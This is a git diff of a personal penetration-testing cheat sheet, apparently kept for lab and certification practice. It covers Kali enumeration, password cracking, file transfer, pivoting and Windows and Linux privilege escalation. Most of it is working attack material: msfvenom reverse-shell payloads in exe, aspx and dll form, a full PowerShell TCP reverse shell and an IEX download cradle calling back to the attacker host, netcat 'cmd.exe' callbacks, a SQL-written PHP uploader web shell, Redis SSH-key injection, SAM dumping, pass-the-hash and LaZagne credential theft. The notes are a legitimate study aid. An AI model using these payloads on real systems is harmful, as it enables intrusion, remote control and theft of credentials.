@@ -1,36 +1,64 @@
-# <span style="color:rgb(11, 142, 224)">General : </span>
+# <span style="color:rgb(11, 142, 224)">Troubleshooting : </span>
 
-MTU:
-if terminals get stuck : 
+MTU/packet fragmentation
+Issue : 
+If terminals get stuck 
+If RDP screen is black 
+If websites are not loading 
+
+Reconnect to VPN
+
+Lower MTU:
 try lowering the MTU to below 1250. We recommend decreasing it in increments of 50 until the connection becomes stable, but please do not set it below 700.
 ```
-sudo ip link set dev tun0 mtu 1000
+sudo ip link set dev tun0 mtu 1350
 ```
 Also, ensure that you are using Google's DNS servers in your Kali by running these commands:  
-`sudo chattr -i /etc/resolv.conf` `sudo bash -c "" echo nameserver 8.8.8.8 > /etc/resolv.conf"" && sudo bash -c "" echo nameserver 8.8.4.4 >> /etc/resolv.conf""`
+```
+sudo chattr -i /etc/resolv.conf
 
-And we have a shell as www / $ , Get a tty (stable shell) shell using, 
+sudo bash -c "" echo nameserver 8.8.8.8 > /etc/resolv.conf"" && sudo bash -c "" echo nameserver 8.8.4.4 >> /etc/resolv.conf""
 ```
-python -c "import pty; pty.spawn('/bin/bash')"
-```
+# <span style="color:rgb(11, 142, 224)">Initial Access </span>
 
-Password cracking 
-john will automatically identify the hashing algorithm
-```
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-```
+##### <span style="color:rgb(11, 142, 224)">Methodology : </span>
 
-To SSH into a user using a private key:
-```
-ssh -i <private_key> <username>@<target_ip>
-```
+try every cred you find everywhere, password reuse shows up a lot
 
-# <span style="color:rgb(11, 142, 224)">Enumeration </span>
+1. Enumerate
+- Nmap → ports, services, versions
+- Check ftp anonymous/ smb nullguest for smb, default creds, configs/files, users
+- Credential finding locations : landing page, every shown pages, directory,  look for names, username, password , weird string could be a username or password , name, email, street name, description, file
+- Can't find password ? try username as password. spray this credentials to other service
+- Reuse every credential everywhere : login page If you found
 
-not always will the machine allow ping 
-thats why add -Pn also in nmap
-because firewall block ping
-you can open the ip website in your browser and check 
+2. Web
+- WhatWeb → tech + versions → `"version CVE"` (if doesnt work the first time then it doesnt work)
+- Browse pages, source, comments, JS, files
+- Hunt creds: names, emails, descriptions, `.git` + history
+- Gobuster + SecLists → dirs/files : then sub directory again
+- Check subdomains
+
+3. Identify
+- Public/CMS → CVE → WPScan / JoomScan / Nikto
+- Custom → test functionality
+
+4. Common Vectors
+- SQLi → Boolean / UNION (add an extra - at the end of SQLi for it to work sometimes)
+- File upload → extension/header/.htaccess bypasses (if its apache you can try uploading .htaccess)
+- LFI / RFI
+- Path Traversal
+- Log Poisoning
+- Command Injection
+
+5. Exploit + Chain
+- Validate CVE → exploit
+- LFI + upload → code execution
+- `.git` → source/secrets → creds
+- Creds → other services
+- Upload + misconfig → code execution
+
+#### <span style="color:rgb(11, 142, 224)">Port Scanning : </span>
 
 Nmap 
 ```
@@ -42,12 +70,101 @@ When the TCP scan finishes, immediately run a UDP scan.
 sudo nmap -Pn -n -sU --top-ports=100 --reason $IP
 ```
 
+#### <span style="color:rgb(11, 142, 224)">Password cracking : </span>
+
+Whenever you find a hash, first try [https://crackstation.net/](https://crackstation.net/)
+If that doesn't work, try John the Ripper or Hashcat. Let it run for not more than 10 minutes.
+
+Google it first, use hashes.org,
+then try `rockyou.txt` wordlist with both hashcat and john. Because sometimes one tool cracks but the other doesn’t. So always try both. Max time I would before moving on is like 15 min. If it still doesn’t crack it’s highly likely that it’s not the intended way.
+
+john will automatically identify the hashing algorithm
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+For Password Hashes from SAM and SYSTEM files : 
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
+```
+Format : `RID : LM hash : NT hash`
+#### <span style="color:rgb(11, 142, 224)">SSH into a user</span>
+To SSH into a user using a private key:
+```
+ssh -i <private_key> <username>@<target_ip>
+```
+#### <span style="color:rgb(11, 142, 224)">Stable Shell : </span>
+
+And we have a shell as www / $ , Get a tty (stable shell) shell using, 
+```
+python -c "import pty; pty.spawn('/bin/bash')"
+```
+#### <span style="color:rgb(11, 142, 224)">SMB null guest login</span>
+
+
+
+#### <span style="color:rgb(11, 142, 224)">FTP anonymous login</span>
+
+Connect:
+```
+ftp 10.129.47.240
+```
+When prompted:
+```
+Name: anonymous
+Password: anonymous
+```
+Then enumerate everything:
+```
+ls -la
+```
+
+confirm FTP is writable
+On your FTP session:
+```
+put test.txt
+```
+If it says:
+```
+226 Transfer complete
+```
+then the directory is writable.
+
+Use MSFvenom to generate the aspx payload.
+```
+msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.138 LPORT=4444 -o reverse-shell.aspx
+```
+Then, we’ll upload the generated payload on the FTP server and confirm that it has been uploaded.
+```
+put reverse-shell.aspx
+```
+check 
+```
+ls 
+```
+
+Start listener on kali
+```
+nc -nlvp 4444
+```
+
+In the web browser load the **reverse-shell.aspx** file we uploaded in the FTP server.
+```
+http://10.129.47.240/reverse-shell.aspx
+```
+Go back to your listener to see if the shell connected back.
+
+#### <span style="color:rgb(11, 142, 224)">Web Application </span>
+
+###### <span style="color:rgb(11, 142, 224)">Enumeration : </span>
+
+Directory brute forcing : 
 Gobuster
 smaller : 
 ```
 sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP>
 ```
 larger : 
+use medium list now
 ```
 sudo gobuster dir -w /usr/share/wordlists/dirb/big.txt -x html,txt,php -u <IP>
 ```
@@ -62,33 +179,8 @@ Wordpress enumeration
 wpscan --url http:<IP> -e ap,at,u
 ```
 
-Redis 
-```
-redis-cli -h <IP> # to connect to the server
+###### <span style="color:rgb(11, 142, 224)">Default Credentials : </span>
 
-after connecting : 
-info                            # to get information/details about the server
-SELECT <database_index>         # select databse
-keys *                          # to key all key names
-get <Key name>                  # to get value of the key 
-config get dir                  # to get config directory for redis
-config set dir /var/lib/redis/.ssh>  # to set a new directory
-
-ssh-keygen -t ed25519           # to make new kali pub ssh key (run as kali user)
-ls -la ~/.ssh/     # to see kali public ssh key 
-( echo -e "\n\n"; cat ~/.ssh/id_ed25519.pub; echo -e "\n\n") > id_rsa.pub   # to make it in format which redis accepts it 
-
-cat id_rsa.pub | redis-cli -h <redis ip> -x set <new key name> # make a new key
-
-config set dbfilename "authorized_keys"    # write our key to redis disk 
-save                                       # to save the file now
-
-ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali 
-```
-
-# <span style="color:rgb(11, 142, 224)">Web Application </span>
-
-use default credentials 
 of username : password same you found , 
 admin:admin etc
 
@@ -96,25 +188,28 @@ phpmyadmin :
 username : root 
 password : leave empty (in some versions it's "password")
 
+Zabbix : 
 
+###### <span style="color:rgb(11, 142, 224)">SQL Injection : </span>
+
+If website has executable SQL commands : 
 Php get upload option to upload any file on website itself 
 ```
 https://gist.github.com/BababaBlue
 ```
-
+code :
 ```
 SELECT 
 "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
 INTO OUTFILE 'C:/wamp/www/uploader.php';
 ```
 after that , upload `PHP Ivan Sincek` revershell to the website
-
-###### Squid Proxy :
+###### <span style="color:rgb(11, 142, 224)">Squid Proxy :</span>
 configure FoxyProxy extension 
 with port number and ip address of victim machine 
 and then load the website 
-
-###### Macro :
+remember to turn off also when visiting other websites
+###### <span style="color:rgb(11, 142, 224)">Macro :</span>
 ```vb
 Sub MyMacro
 	Dim str as String
@@ -148,89 +243,108 @@ Once the bot opens the document → Metasploit catches the staged connection →
 ```
 sessions -i 1
 ```
+###### <span style="color:rgb(11, 142, 224)">Redis</span> 
 
-Steps : 
-1. Identify Web Tech (language, framework, libs, cms, etc) - use wappalyzer
-2. Look for CVE if it uses public framework / libs / cms, if it doesnt work the first time then it doesnt work.
-3. Then Find likely vulnerable feature such as file upload, local file inclusion, sqli.
-4. try default credentials if you found login page.
-5. If it doesnt work then it's likely credentials hunting.
-6. Find for credentials in the landing page, and every shown pages and directory. look for names, username, password. If you see a string thats kinda weird thats could be a username or password.
-7. Can't find password ? try username as password. spray this credentials to other service.
-8. Can't find anything ? Fuzz the directory, look for differences on response type / length could be a clue. then fuzz the sub directory again (using seclist is enough).
-9. Still can't find anything ? then its a rabbit hole.
+```
+redis-cli -h <IP> # to connect to the server
 
-# <span style="color:rgb(11, 142, 224)">File Transfer & Reverse Shell </span>
+after connecting : 
+info                            # to get information/details about the server
+SELECT <database_index>         # select databse
+keys *                          # to key all key names
+get <Key name>                  # to get value of the key 
+config get dir                  # to get config directory for redis
+config set dir /var/lib/redis/.ssh>  # to set a new directory
 
-Start server on kali/windows : 
-you won't be able to start on 80 on victim machine if it already has something running
+ssh-keygen -t ed25519           # to make new kali pub ssh key (run as kali user)
+ls -la ~/.ssh/     # to see kali public ssh key 
+( echo -e "\n\n"; cat ~/.ssh/id_ed25519.pub; echo -e "\n\n") > id_rsa.pub   # to make it in format which redis accepts it 
+
+cat id_rsa.pub | redis-cli -h <redis ip> -x set <new key name> # make a new key
+
+config set dbfilename "authorized_keys"    # write our key to redis disk 
+save                                       # to save the file now
+
+ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali 
+```
+
+# <span style="color:rgb(11, 142, 224)">File Transfer</span>
+
+### <span style="color:rgb(11, 142, 224)">If file not downloading : </span>
+
+The error `Access to the path 'C:\nc.exe' is denied` occurs because you're trying to save `nc.exe` directly in `C:\`, and your current user does not have permission to write there.
+
+check for your writeable permissions in current folder : 
+```
+icacls .
+```
+switch folders until you get look for  W (Write-only access)* , M (Modify access), F (Full access)
+
+switch to temp folder 
+```
+cd C:\Temp
+```
+
+switch to users 
+```
+cd C:\
+dir
+icacls .
+```
+switch to public 
+```
+cd C:\Users\Public
+```
+
+----
+### <span style="color:rgb(11, 142, 224)">Kali Linux → Windows</span> 
+
+Start server on kali : 
+you won't be able to start on 80 on victim machine if it already has something running (for Linux victims)
 ```
 python3 -m http.server 8000
 ```
 
-Linux get file : 
-```
-wget http://<ip>:8000/filename -O filename
-curl http://<ip>/filename -o filename
-
-nc <victim ip> 4444 < filename     # sender 
-nc -lvnp 4444 > filename           # receiver
-```
-
 Windows get file : 
-
-CMD:
-1st priority : 
+CMD (1st priority) : 
 ```
 certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
 ```
-or
-```
-powershell -Command "iwr 'http://<kali ip>:8000/reverse.exe' -OutFile 'C:\Program Files\File Permissions Service\filepermservice.exe'"
-```
-or 
+PowerShell : 
 ```
 powershell iwr http://KALI_IP:8000/filename -o filename
+
+powershell -Command "iwr 'http://<kali ip>:8000/reverse.exe' -OutFile 'C:\Program Files\File Permissions Service\filepermservice.exe'"
 ```
 
-PowerShell:
-switch to PowerShell first
+<span style="color:rgb(11, 142, 224)">If you want to download directly to a path :</span>
+<span style="color:rgb(11, 142, 224)">KEEP NAME OF .EXE SAME AS THAT OF `service name.exe`</span>
 ```
-iwr http://KALI_IP:8000/filename -outfile filename
-Invoke-WebRequest http://KALI_IP:8000/filename -outfile filename
+certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
 ```
 
-##### <span style="color:rgb(11, 142, 224)">Netcat (to get shell back on kali and not use windows rdp): </span>
-transfer `nc.exe` to windows : 
-First locate a copy:
+<span style="color:rgb(11, 142, 224)">or if you want in current directory : </span>
 ```
-find /usr/share -iname "nc.exe" 2>/dev/null
+certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
 ```
-then copy it to current folder where python server is running 
+<span style="color:rgb(11, 142, 224)">then transfer to desire directory : </span>
 ```
-cp /usr/share/windows-resources/binaries/nc.exe .
+move <file name from current folder> <full path with with file name>
 ```
-then start python server and transfer
-to get shell back from windows to kali : 
-start a listener on Kali:
-```
-rlwrap -f . nc -lvnp 4444
-```
-windows command to get reverse shell of cmd : 
-```
-nc.exe -e cmd.exe <kali ip> 4444
-```
-##### <span style="color:rgb(11, 142, 224)">Windows → Kali Linux using SMB (If python is not installed on windows)</span>
+
+### <span style="color:rgb(11, 142, 224)">Windows → Kali Linux using SMB</span>
 On Kali start SMB server : 
 ```
-impacket-smbserver share .
+impacket-smbserver share . 
+# if error - wants smb2 : 
+impacket-smbserver share . -smb2support
 ```
 On windows transfer files : 
 ```
 copy <input file name> \\<kali ip>\share\<output file name>
-
 # ex. copy windows.txt \\192.168.131.128\share\windows.txt
 ```
+
 If errors : 
 ```
 on attacker machine : 
@@ -243,36 +357,102 @@ dir z:
 here , "randomname" is just a random name given , and can give any username and password 
 "." here is work in the current directory
 authentication required as some servers so not accept without auth
-### <span style="color:rgb(11, 142, 224)">Reverse Shell : </span>
+
+-----
+### <span style="color:rgb(11, 142, 224)">Netcat (to get shell back on kali and not use windows rdp): </span>
+
+Download 64 bit netcat : 
+if required then download 32 bit x86 netcat
+```
+https://github.com/int0x33/nc.exe/
+```
+RDP into target
+```bash
+xfreerdp /v:10.49.147.79 /u:user /p:password321 /cert:ignore /dynamic-resolution
+```
+start python server
+```bash
+python3 -m http.server 8000
+```
+on windows , get file from kali : 
+```cmd
+powershell iwr http://192.168.163.199:8000/nc64.exe -o nc64.exe
+```
+start listener on kali : 
+```bash
+rlwrap -f . nc -lvnp 4444
+```
+on windows execute rev shell : 
+```cmd
+nc64.exe -e cmd.exe 192.168.163.199 4444
+```
+
+-----
+### Linux get file : 
+```
+wget http://<ip>:8000/filename -O filename
+curl http://<ip>/filename -o filename
+
+nc <victim ip> 4444 < filename     # sender 
+nc -lvnp 4444 > filename           # receiver
+```
+
+
+# <span style="color:rgb(11, 142, 224)">Reverse Shells : </span>
+
+<span style="color:rgb(11, 142, 224)">if we didn't wanted a call back to our listener using a reverse shell<br>we could have gotten system in same shell as well</span>
+```
+PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
+```
 
 go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
+
+<span style="color:rgb(11, 142, 224)">For 64 bit windows : </span>
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
 ```
-enter our kali ip and port
-start listener on kali 
+<span style="color:rgb(11, 142, 224)">For 32 bit x86 architecture : </span>
 ```
-rlwrap -cAr nc -lvnp 4444
-```
-transfer to windows on the same `service.exe` file location
-start python server on kali : 
-```
-python3 -m http.server 8000
-```
-switch to :temp folder on windows :
-```
-cd C:\temp
-```
-download on windows :
-If you want to download directly to a path :
-```
-certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
-```
-or if you want in current directory : 
-```
-certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
 ```
 
+#### <span style="color:rgb(11, 142, 224)">PowerShell : </span>
+Exploit Script : 
+replace the kali ip here 
+Use single quotes for the outer PowerShell string and keep the inner command in double quotes:
+```
+$cmd = 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.163.199:8000/mypowershell.ps1'')"'
+```
+
+with your reverse shell looking like:
+Payload script : 
+replace the kali ip here 
+```
+$client = New-Object System.Net.Sockets.TCPClient("192.168.163.199",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+you should get a shell on your Netcat listener on port 4444
+
+#### Reverse shell in Metasploit Multi Handler : 
+
+Both the reverse shell you are creating and the payload you are setting in multi handler should be same value
+create reverse shell For Metasploit Meterpreter handler : 
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
+```
+transfer to windows 
+now back on kali start listener 
+```
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.174 [Kali VM IP Address] 
+set lport 4444
+run
+```
+now run our reverse shell on windows : 
+```
+reverse.exe
+```
 # <span style="color:rgb(11, 142, 224)">Port Forwarding/Pivoting </span>
 
 after gaining initial access , to <span style="color:rgb(11, 142, 224)">discover more devices on same network</span> use nmap to scan
@@ -340,6 +520,12 @@ chisel.exe client <KALI_IP>:8000 R:<SOCKS_PORT>:socks
 ```
 
 # <span style="color:rgb(11, 142, 224)">Linux Privilege Escalation</span>
+
+##### <span style="color:rgb(11, 142, 224)">Methodology : </span>
+
+1. enumerate the services very hard
+2. Use linpeas, pspy
+##### General : 
 
 Linux has `tmp` folder , which is world writeable
 ```
@@ -904,6 +1090,16 @@ openssl passwd -6 password123 #create a new passowrd hash ; $6$ is sha512
 If nothing works , then try Linpeas
 # <span style="color:rgb(11, 142, 224)">Windows Privilege Escalation</span>
 
+#### <span style="color:rgb(11, 142, 224)">Methodology : </span>
+
+- Quick check C:\ drive for non default folders.
+- `tree /F /A .` on C:/Users/ directory, look for suspicious files.
+- Quick check Program Files to find non default Software
+- Run `whoami /all`, then PrivEscCheck, then PowerUp, then WinPEAS.
+- The above will give you all info you need. Save output and slowly go over it.
+- If you get completely stuck, you can manually check for things too.
+##### <span style="color:rgb(11, 142, 224)">General : </span>
+
 Find Flag 
 do manually first : `users > desktop/documents`
 ```
@@ -911,20 +1107,55 @@ where /r C:\ local.txt
 where /r C:\ proof.txt
 ```
 
-like `tmp` folder in linux , windows has `tasks` folder , which is world writeable
+<span style="color:rgb(11, 142, 224)">if we didn't wanted a call back to our listener using a reverse shell</span>
+<span style="color:rgb(11, 142, 224)">we could have gotten system in same shell as well</span>
 ```
-cd C:\temp
-or
-PS C:\Windows> cd tasks
+PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
+# instead of reverse.exe we replaces it with cmd location
 ```
 
-If in powershell you are unable to execute scripts : 
+<span style="color:rgb(11, 142, 224)">To check for our permissions on a file : </span>
+switch to PowerShell : 
+```
+powershell
+```
+run : 
+```
+Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\services\regsvc | fl
+```
+check for `Access : NT AUTHORITY\INTERACTIVE Allow  FullControl`
+check for `Everyone`
+we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
+so it means we can edit this path 
+or 
+```
+icacls .
+# "." here is current folder , for a location enter folder location
+```
+
+<span style="color:rgb(11, 142, 224)">Admin to System privilege escalation :</span>
+To get a local service shell if you are an admin 
+```
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+```
+get `PSExec64.exe` and a reverse shell in same folder
+from here check `whoami /priv` or try other methods and escalate to system
+Check "Windows UAC Bypass" for Admin Medium to High Integrity privilege escalation
+
+<span style="color:rgb(11, 142, 224)">If in powershell you are unable to execute scripts : </span>
 ```
 powershell -executionpolicy bypass
 ```
 ###### <span style="color:rgb(11, 142, 224)">To connect to RDP : </span>
+
+BLACK SCREEN : lower mtu to 1000
 ```
 xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
+```
+or
+When it isn't connecting : 
+```
+xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /sec:rdp
 ```
 or 
 ```
@@ -933,13 +1164,10 @@ xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-si
 Enter the password when prompted.
 
 Transfer `nc.exe` to windows and get a reverse shell : 
-First locate a copy:
+Download 64 bit netcat : 
+if required then download 32 bit x86 netcat
 ```
-find /usr/share -iname "nc.exe" 2>/dev/null
-```
-then copy it to current folder where python server is running 
-```
-cp /usr/share/windows-resources/binaries/nc.exe .
+https://github.com/int0x33/nc.exe/
 ```
 start python server : 
 ```
@@ -959,7 +1187,7 @@ windows command to get reverse shell of cmd :
 nc.exe -e cmd.exe <kali ip> 4444
 ```
 
-###### <span style="color:rgb(11, 142, 224)">Basic Manual enumeration : </span>
+##### <span style="color:rgb(11, 142, 224)">Basic Manual enumeration : </span>
 ###### User 
 to check current user 
 ```
@@ -1066,6 +1294,28 @@ icacls <file name> /setintegritylevel m
 # h = high
 # you cannot set integrity level higher than that of your user
 ```
+##### <span style="color:rgb(11, 142, 224)">Winpeas (Look for easy wins here first)</span>
+###### If nothing works , then try Winpeas
+Download `winPEASx64.exe` : 
+```
+https://github.com/peass-ng/PEASS-ng/releases/tag/20260922-7b7c14db
+```
+transfer to windows
+run : 
+```
+.\winPEASx64.exe > windows.txt
+```
+we'll run winpeas and transfer our file back to kali to analyze more properly
+
+For searching a specific thing in winpeas : 
+```
+grep -aiA 10 "Looking if you can modify any service registry" windows.txt
+grep -aiA 10 "AlwaysInstallElevated" windows.txt
+grep -aiA 10 "startup" windows.txt
+grep -aiA 10 "putty" windows.txt
+```
+
+if found creds in putty , login using ssh
 
 ### <span style="color:rgb(11, 142, 224)">Service Abuse : </span>
 
@@ -1151,6 +1401,11 @@ powershell iwr http://192.168.163.199:8000/accesschk.exe -o accesschk.exe
 
 Use SharpUp and Look for
 === Modifiable Service Binaries ===
+
+```cmd
+wmic service get name, startname, pathname
+```
+can be quoted path as well here
 
 ```
 sc qc filepermsvc
@@ -1269,14 +1524,20 @@ wmic service get name, startname, pathname
 ```
 From here look for those services :
 1. Which don't have quotes (" ")
-2. which seems like custom services not default ones
-3. don't focus on system32 or admin directories
-4. which are in program files or tmp or users directory 
-5. Look for "LocalSystem"
+2. **Contains whitespaces** (e.g., `C:\Program Files\Some Folder\app.exe`)
+3. which seems like custom services not default ones
+4. don't focus on system32 or admin directories
+5. which are in program files or tmp or users directory 
+6. Running as **LocalSystem**
+No quotes + spaces in path + LocalSystem = **exploitable**
 
 automated way : (do manual also)
 well use PowerUp (PowerShell) for that
 go to automated tools for that
+You can also use the targeted function:
+```powershell
+Get-ServiceUnquoted
+```
 now look for `[*] Checking for unquoted service paths...`
 
 now for ex. if we get `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
@@ -1298,7 +1559,7 @@ C:\Program Files\Unquoted Path.exe
 C:\Program Files\Unquoted Path Service\Common.exe
 C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe 
 ```
-make a reverse shell with the name of "FOLDER.exe"
+make a reverse shell with the name of "FOLDER NAME FIRST WORD.exe"
 transfer to windows 
 and paste in this path
 
@@ -1328,12 +1589,82 @@ net start unquotedsvc
 well get the shell back
 ###### <span style="color:rgb(11, 142, 224)">Method 4 : DLL Hijacking </span>
 
+SAME AS UNQUOTED SERVICE PATHS CONCEPT
+
+PowerUp (PowerShell) :
+download from :
+https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+transfer to windows 
+switch to power shell : 
+```
+powershell
+```
+Import PowerUp in powershell
+```
+Import-Module .\PowerUp.ps1
+```
+Run all checks
+```
+Invoke-AllChecks
+```
+Look for `Checking %PATH%" for potentially hijackable DLL locations`
+
 Enumeration 1 : 
 ProcMon :
 ```
-▹ Add Filter: Process Name = yourapp.exe
+▹ Add Filter: Process Name = yourapp.exe (process name , is , <filename>.exe , include , add , apply)
 ▹ Add Filter: Result = NAME NOT FOUND
 ```
+
+and serach for `dllsvc` 
+```
+sc qc dllsvc
+```
+now we start the service manually again : 
+```
+sc start dllsvc
+```
+observe on procmon 
+we see some entries it is creating some files 
+we see how much access we have on this folder which it is using
+```
+icacls "C:\Program Files\DLL Hijack Service"
+```
+again well check other folder , check all 
+acc to the path
+```
+echo %PATH%
+```
+now well make a malicious dll using msfvenom 
+make the output file of the same name 
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f dll -o hijackme.dll
+```
+now well transfer to windows now 
+start python server on kali : 
+```
+python3 -m http.server 8000
+```
+download on windows :
+If you want to download directly to a path :
+```
+certutil -f -urlcache http://192.168.163.199:8000/hijackme.dll "C:\temp\hijackme.dll"
+```
+start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+stop service 
+```
+sc stop dllsvc
+```
+then start 
+```
+sc start dllsvc
+```
+we get a reverse shell back : 
+
+OPTION 2 : 
 
 Enumeration 2 :
 Check permissions to unprivileged paths
@@ -1359,56 +1690,968 @@ sc stop <service_name>
 
 ### <span style="color:rgb(11, 142, 224)">Sensitive Credentials</span>
 
+###### <span style="color:rgb(11, 142, 224)">Unattended Windows Installations</span>
 
+first come to C:\ folder 
+```
+cd C:\
+```
+search all files in C:\
+```
+dir /s /b | findstr /i "unattend.xml"
+```
+then view each file by 
+```
+type "full path of file"
+```
+###### <span style="color:rgb(11, 142, 224)">Powershell History</span>
 
+CMD : 
+```
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
 
+PowerShell : 
+```
+cat (Get-PSReadlineOption).HistorySavePath
+```
+###### <span style="color:rgb(11, 142, 224)">Saved Windows Credentials</span>
 
+```shell-session
+cmdkey /list
+```
+do to see which all groups have which all users
+```
+net user
+```
+While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option
+```shell-session
+runas /savecred /user:<found username here> cmd.exe
+runas /savecred /user:admin cmd.exe
+```
+###### <span style="color:rgb(11, 142, 224)">IIS Configuration</span>
 
+```shell-session
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+find 
+```
+<add connectionString
+```
+in last 
+###### <span style="color:rgb(11, 142, 224)">Retrieve Credentials from Software: PuTTY</span>
 
+To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
 
+```shell-session
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
 
+**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
+
+It might be that the user same password for system as well so try it also
+###### <span style="color:rgb(11, 142, 224)">Browser saved passwords : </span>
+
+download `Lazagne.exe `from : 
+```
+https://github.com/AlessandroZ/LaZagne/releases/tag/v2.4.7
+```
+transfer to windows 
+```
+.\LaZagne.exe all
+.\laZagne.exe browsers
+.\laZagne.exe browsers -firefox
+```
+###### <span style="color:rgb(11, 142, 224)">Passwords - Security Account Manager (SAM)</span>
+
+The standard locations are:
+```
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+```
+
+If for ex. system has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory
+
+we go to the directory
+```
+cd C:\Windows\Repair
+C:\Windows\Repair>dir
+```
+Transfer the SAM and SYSTEM files to your Kali VM using SMB 
+On Kali start SMB server : 
+```
+impacket-smbserver share .
+```
+On windows transfer files : 
+```
+copy <input file name> \\<kali ip>\share\<output file name>
+
+# copy SAM \\192.168.163.199\share\SAM
+# copy SYSTEM \\192.168.163.199\share\SYSTEM
+```
+now well use secrets dump by impacket 
+```
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+<span style="color:rgb(11, 142, 224)">Method 1 : Pass the Hash (Preferred)</span>
+now well do pass the hash using psexec to gain admin 
+since we got admin hash
+**Hash format:** `uid:rid:lmhash:nthash` — the **last hash** (after the second `:`) is the **NTLM hash** you want.
+```
+impacket-psexec Administrator@<windows target ip> -hashes :<password hash>
+```
+ Spacing is strict. The format is `-hashes :<NTLM_HASH>` (colon before the hash, no LM hash).
+for some user it might work for some users it might now
+```
+impacket-psexec admin@10.49.149.124 -hashes :a9fdfa038c4b75ebc76dc855dd74f0da
+```
+well get a shell of admin
+
+<span style="color:rgb(11, 142, 224)">Method 2 : Password cracking </span>
+john will automatically identify the hashing algorithm
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
+```
+You can use the cracked password to log in as the admin using winexe or RDP.
+### <span style="color:rgb(11, 142, 224)">Registry Attacks</span>
+
+Windows Registry = A shared database where Windows stores configuration settings.
+###### <span style="color:rgb(11, 142, 224)">Autorun</span>
+
+Enumeration : 
+Check Run or RunOnce keys :
+```
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+```
+
+Check write access to the exe for current user:
+check for both the paths locations 
+```
+icacls <directory/file>
+accesschk.exe -accepteula -wuqv [file]
+```
+we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
+so it means we can edit this path 
+
+paste reverse shell (.exe) to that location to replace the program that is starting in Autorun
+Start a listener on Kali
+
+Wait for the administrator to log on
+restart the Windows VM.
+Open up a new RDP session (with username as admin) to trigger a reverse shell running with admin privileges.
+
+###### <span style="color:rgb(11, 142, 224)">Weak Registry Permissions (changing path of executable in registry)</span>
+
+Use Winpeas 
+grep only that section from winpeas output 
+```
+grep -aiA 5 "Looking if you can modify any service registry" windows.txt
+```
+
+now we get details about this service in registry for full `ImagePath`
+```
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
+```
+
+we check for our permissions on the path :
+switch to PowerShell
+```
+Get-Acl -Path "HKLM\System\CurrentControlSet\services\regsvc" | fl
